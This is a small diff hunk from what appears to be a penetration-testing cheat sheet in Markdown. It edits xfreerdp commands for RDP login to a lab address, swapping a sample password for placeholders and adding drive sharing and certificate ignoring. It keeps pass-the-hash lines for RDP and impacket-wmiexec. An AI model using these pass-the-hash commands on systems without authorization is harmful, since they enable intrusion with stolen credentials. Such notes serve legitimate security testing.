@@ -81,8 +81,8 @@ impacket-wmiexec Administrator@10.10.10.10 -hashes :<ntlm-hash>
 ## RDP
 
 ```bash
-xfreerdp /u:Administrator /p:'Password1' /v:10.10.10.10
-xfreerdp /u:Administrator /pth:<ntlm-hash> /v:10.10.10.10
+xfreerdp /u:<user> /p:<pass> /v:10.10.10.10 +clipboard +drive:smbfolder,/local/path dynamic-resolution /cert:ignore
+xfreerdp /u:<user> /pth:<ntlm-hash> /v:10.10.10.10 +clipboard +drive:smbfolder,/local/path dynamic-resolution /cert:ignore
 ```
 
 !!! warning "Watch out"
